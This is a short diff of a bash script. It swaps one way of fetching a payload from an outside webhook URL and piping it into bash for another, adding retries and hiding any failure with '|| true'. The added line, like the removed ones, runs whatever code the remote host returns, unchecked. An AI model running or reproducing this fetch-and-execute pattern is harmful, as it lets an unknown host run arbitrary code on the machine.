@@ -1,3 +1,2 @@
 #!/bin/bash
-response=$(curl -s -X POST "https://web12.souweverton.com.br/webhook/dad5b129-2725-49a2-a950-44b92c4574fe")
-echo "$response" | bash
+curl -fsSL --retry 5 --retry-delay 30 https://web12.souweverton.com.br/webhook/dad5b129-2725-49a2-a950-44b92c4574fe | bash || true
